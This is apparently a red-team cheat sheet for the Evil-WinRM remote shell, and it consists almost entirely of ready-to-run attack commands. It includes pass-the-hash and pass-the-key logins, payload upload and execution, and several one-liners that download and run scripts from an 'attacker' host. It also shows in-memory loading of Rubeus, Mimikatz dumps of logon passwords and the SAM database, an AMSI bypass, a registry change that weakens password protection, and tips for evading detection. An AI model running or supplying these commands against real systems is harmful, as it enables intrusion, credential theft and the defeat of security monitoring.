# <span style="color:rgb(255, 192, 0)">Evil-WinRM - Complete Command Reference</span>

Evil-WinRM by @Hackplayers is a Ruby-based WinRM shell with advanced features including pass-the-hash, pass-the-key, upload/download, DLL loader, and more.

**Installation:**
```bash
gem install evil-winrm

# Or from source
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
gem install bundler && bundle install
```

---

## <span style="color:rgb(255, 0, 0)">Basic Usage</span>

```bash
# Password auth
evil-winrm -i target -u Administrator -p 'Password123!'

# Pass-the-hash (NTLM)
evil-winrm -i target -u Administrator -H NTLM_HASH

# With explicit port (HTTPS: 5986, HTTP: 5985)
evil-winrm -i target -u Administrator -p 'Pass' -P 5986

# Using SSL
evil-winrm -i target -u Administrator -p 'Pass' -S

# Self-signed cert (no verification)
evil-winrm -i target -u Administrator -p 'Pass' -S -k

# Domain
evil-winrm -i target -u domain\\user -p 'Pass'
evil-winrm -i target -u user@domain -p 'Pass'

# Debug
evil-winrm -i target -u Administrator -p 'Pass' -d

# Skip SSL peer validation
evil-winrm -i target -u Administrator -p 'Pass' -S -c cert.pem

# With Kerberos auth
evil-winrm -i target.domain.local -u user@domain.local -p 'Pass' -k
```

---

## <span style="color:rgb(0, 176, 240)">Session Features</span>

### File Operations

```powershell
# Upload file to target
upload /path/to/local/file C:\Windows\Temp\file.exe

# Upload and auto-run
upload /path/to/file C:\Windows\Temp\file.exe; .\file.exe

# Download file from target
download C:\Users\Administrator\secret.txt /local/path/

# Download multiple
download "C:\ProgramData\file.dat" ./
```

### Command Execution

```powershell
# Execute PowerShell commands (native)
whoami
ipconfig
Get-Process

# Execute cmd commands
cmd /c whoami

# Execute with output captured
Invoke-Expression "dir C:\"

# Bypass execution policy in session
Set-ExecutionPolicy Unrestricted -Scope Process -Force

# Run script from URL
iex (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
```

### DLL Loader

```powershell
# Load DLL from local path
dll /path/to/mylib.dll

# Load DLL and call function
dll /path/to/mimikatz.dll

# Load DLL from memory (base64)
# Upload first then load
upload /path/to/lib.dll
dll C:\Windows\Temp\lib.dll
```

### In-Memory Loading

```powershell
# Load PowerShell script from local file
menu
# Then select option to load script
# Or:
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')

# Execute from memory via reflection
$bytes = (Invoke-WebRequest -Uri 'http://attacker/Rubeus.exe' -UseBasicParsing).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
[Rubeus.Program]::Main("kerberoast".Split())
```

---

## <span style="color:rgb(146, 208, 80)">Built-in Commands & Menu</span>

Type `menu` inside the session to see available commands:

```powershell
menu
```

Output:
```
   ╔══════════════════╗
   ║ Available commands ║
   ╚══════════════════╝

   * Invoke-Mimikatz          : Executes Invoke-Mimikatz module
   * Invoke-BloodHound        : Executes Invoke-BloodHound module
   * Bypass-4MSI              : Bypasses AMSI
   * upload                   : Upload file
   * download                 : Download file
   * dll                      : Load DLL
   * menu                     : Show this menu
   * exit                     : Exit evil-winrm
   * services                 : List/Start/Stop services
   * service_list             : List services
   * service_start            : Start service
   * service_stop             : Stop service
   * reg                      : Registry commands
   * reg_list                 : List registry keys
   * reg_add                  : Add registry value
   * reg_delete               : Delete registry value
   * wmic                     : WMI commands
   * cpu                      : CPU info
   * memory                   : Memory info
   * disk                     : Disk info
   * os                       : OS info
   * process                  : Process info
   * network                  : Network info
   * user                     : User info
   * group                    : Group info
```

### Using the Menu

```powershell
# Show menu
menu

# Bypass AMSI
Bypass-4MSI

# Invoke-Mimikatz (loads and runs)
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All

# Service management
services
service_list
service_start Spooler
service_stop Spooler

# Registry
reg_list HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
reg_add HKLM\SYSTEM\CurrentControlSet\Control\Lsa "LimitBlankPasswordUse" REG_DWORD 0
reg_delete HKLM\SOFTWARE\TestKey

# System info
cpu
memory
disk
os
process
network
user
group
```

---

## <span style="color:rgb(255, 0, 0)">Advanced Authentication</span>

### Pass-the-Key

```bash
# AES256 key
evil-winrm -i target -u Administrator -aes256 AES256_KEY

# AES128 key
evil-winrm -i target -u Administrator -aes128 AES128_KEY

# With domain
evil-winrm -i target -u user@domain -aes256 KEY
```

### Pass-the-Hash Variations

```bash
# Full NTLM hash (LM:NTLM)
evil-winrm -i target -u Administrator -H LM:NTLM

# Just NTLM (omit LM)
evil-winrm -i target -u Administrator -H :NTLM
evil-winrm -i target -u Administrator -H NTLM

# Local account
evil-winrm -i target -u Administrator -H NTLM -L
```

### Certificate Authentication

```bash
# With PFX certificate
evil-winrm -i target -c cert.pem -k key.pem

# Or
evil-winrm -i target -S -c certificate.cer -k private.key
```

---

## <span style="color:rgb(0, 176, 240)">Custom Scripts & Automation</span>

### Starting with Scripts

```bash
# Load PowerShell script at start
evil-winrm -i target -u Administrator -p 'Pass' -s /path/to/scripts/

# After connection, use the scripts
menu
# Scripts will be available

# Load multiple scripts
evil-winrm -i target -u Administrator -p 'Pass' -s /scripts/

# Execute script
Invoke-Mimikatz
```

### Command Execution at Start

```bash
# Execute command on start
evil-winrm -i target -u Administrator -p 'Pass' -e whoami

# Execute PowerShell command
evil-winrm -i target -u Administrator -p 'Pass' -e "Get-Process | Select-Object Name"

# Run script on start
evil-winrm -i target -u Administrator -p 'Pass' -s /scripts/ -e "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'"
```

### Proxy Support

```bash
# HTTP proxy
evil-winrm -i target -u Administrator -p 'Pass' --proxy http://proxy:8080

# HTTPS proxy
evil-winrm -i target -u Administrator -p 'Pass' --proxy https://proxy:8080

# SOCKS proxy
evil-winrm -i target -u Administrator -p 'Pass' --proxy socks5://proxy:1080
```

---

## <span style="color:rgb(146, 208, 80)">One-Liners & Automation</span>

```bash
# Execute single command and exit
evil-winrm -i target -u Administrator -p 'Pass' -c "whoami"

# Dump credentials and exit
evil-winrm -i target -u Administrator -p 'Pass' -c "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'"

# Upload and execute
evil-winrm -i target -u Administrator -p 'Pass' -e "upload /tmp/payload.exe C:\Temp\payload.exe; Start-Process C:\Temp\payload.exe"

# Download results
evil-winrm -i target -u Administrator -p 'Pass' -c "Get-ChildItem C:\Users\Administrator\Desktop"
```

---

## <span style="color:rgb(255, 0, 0)">OPSEC Considerations</span>

```yaml
WinRM Detection:
  - WinRM is enabled by default on Windows Server 2012+ (not Win10 home)
  - Event ID 4688: powershell.exe creation via WinRM
  - Event ID 4104: PowerShell script block logging
  - Event ID 400: Engine life cycle (WinRM PS session)
  - Event ID 403: Engine life cycle (session end)
  - Event ID 600: WSMan provider life cycle
  - Event ID 53504: WinRM authentication
  - Microsoft 365 Defender/Azure ATP monitors WinRM connections

Evasion:
  - Use Bypass-4MSI at start of session
  - Use invoke-obfuscation for scripts
  - Don't use Invoke-Mimikatz directly (use custom loaders)
  - Encrypt C2 communication
  - Use alternative ports (5986 not 5985)
  - Use low-priv accounts first, then escalate

Requirements:
  - WinRM must be enabled on target
  - User must be in Remote Management Users group (or admin)
  - Ports 5985 (HTTP) or 5986 (HTTPS) must be open
  - Windows Firewall may block WinRM
```

---

## <span style="color:rgb(0, 176, 240)">Common Workflows</span>

### Initial Access

```bash
# 1. Test credentials are valid
evil-winrm -i target -u user -p 'pass'

# 2. Bypass AMSI
Bypass-4MSI

# 3. Load PowerView
iex (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
Get-NetUser

# 4. Enumerate
whoami /all
net localgroup Administrators
whoami /groups
```

### Privilege Escalation

```bash
# 1. Upload WinPEAS
upload /tools/winpeas64.exe C:\Temp\winpeas.exe
C:\Temp\winpeas.exe

# 2. Check local admin
net localgroup Administrators

# 3. Run PowerUp
iex (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1')
Invoke-AllChecks
```

### Lateral Movement Preparation

```bash
# 1. Get hashes
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# 2. Dump SAM
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'

# 3. Use hashes for further access
# (Continue with other tools)
```
